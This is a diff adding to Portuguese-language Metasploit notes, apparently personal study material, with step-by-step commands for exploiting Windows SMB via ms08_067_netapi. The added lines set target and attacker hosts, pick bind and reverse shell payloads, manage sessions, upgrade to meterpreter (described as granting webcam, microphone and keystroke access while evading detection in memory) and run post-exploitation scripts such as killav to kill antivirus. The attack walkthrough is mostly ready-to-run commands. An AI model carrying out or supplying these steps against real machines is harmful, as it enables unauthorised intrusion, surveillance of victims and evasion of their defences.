@@ -52,6 +52,9 @@ search firefox
 Faz pesquisa de xploits de 2016 encontrados no lado do cliente (browsers, serviços e etc)
 search cve:2016 type:exploit app:client
 
+Verificação do exploit e informações dos sistemas vulneraveis e aplicação do exploit:
+info exploit/windows/smb/ms08_067_netapi
+
 Nas descrições das falhas, exite um ID do exploit e ranking de sucesso na tentativa normal|good|great|excellent (Os excellent tem muita possibilidade de ser efetivo)
 
 ------------------------------------------------------------------------------
@@ -65,7 +68,75 @@ show options
   OBS: Algumas opções mostradas são necessarias serem setadas para carregar o payload
   
   
+Para setar manualmente as informações no Payload, usar o comando "set"
+
+Passar o Host Remoto para o payload
+set RHOST 192.168.1.12
+
+Verificar informações passadas;
+show options
+
+Para conexões reversas (aonde a vitima se conectara com o atacante) é possivel setar o LHOST (Local host - Atacante) global (Nesse caso em todos os payloads o LHOST ja estaria configurado)
+
+setg LHOST 192.168.1.10      (o "setg" passa o parametro global - para todos os payloads)
+
+Setando o payload a ser usado ( no exemplo a conexão é direta - bind_tcp) que abre o shell do windows:
+
+set PAYLOAD windows/shell/bind_tcp
+
+Caso tenha esquecido de setar alguma informação, o comando abaixo ira informar:
+
+show missing
+
+Para realizar o exploit:
+
+exploit
+=========================================
+Para conexão reversa (cliente se conecta ao servidor - Atacante)
+
+usar o PAYLOAD /windows/shell/reverse_tcp   (Esse payload não permite opções avançadas na maquina remota, apenas alguns comandos)
+
+set LHOST 192.168.1.10
+set LPORT 4000
+set RHOST 192.168.1.20
+exploit
+###Para manter a sessão ativa, sair do terminal com CTRL+z e manter a sessão ativa em background
+
+Para gerenciar as sessoes:
+sessions
+
+Verificar as sessoes ativas:
+sessions -l
+
+Para retornar para a sessão:
+sessions -i 1    ( o "1" representa a sessão informada pelo comando "sessions -l")
+
+Update de sessão para o meterpreter: (O meterpreter é um exploit podereso, que da acesso ao sistema completo - camera, mocrofone, digitação etc)
+sessions -u 1
+  OBS: O comando acima, abre uma outra sessão usando o meterpreter.
+  
+Esse comando instala no PC remoto o meterpreter e o multhandler, que permite a conexão reversa
+  OBS: O meterpreter roda apenas na memoria da maquina e não no disco, dificultando a sua detecção.
+  
+ 
+Para utilizar a sessão meterpreter:
+sesions -l 
+sessions -i 2
+
+Para verificar as opções do meterpreter (tem opção de keyloger, webcam, microfone e etc):
+?
+
+
 ---------------------------------------------------------------------------------
+Scripts do meterpreter:
+Como usar:
+sessions -s script 2        (-s= invoca o script, 2= o numero da sessão)
+
+killav - Tenta matar processos do antivirus
+checkvm - tenta identificar plataforma da maquina (caso seja maquina virtual)
+
+Para verificar scripts disponiveis:
+search post/windows  (o "post" é de pós exploração e o "windows" a plataforma que utilizará)
 --------------------------------------------------------------------------------------
 Gerar XML com nmap
 NMAP: 
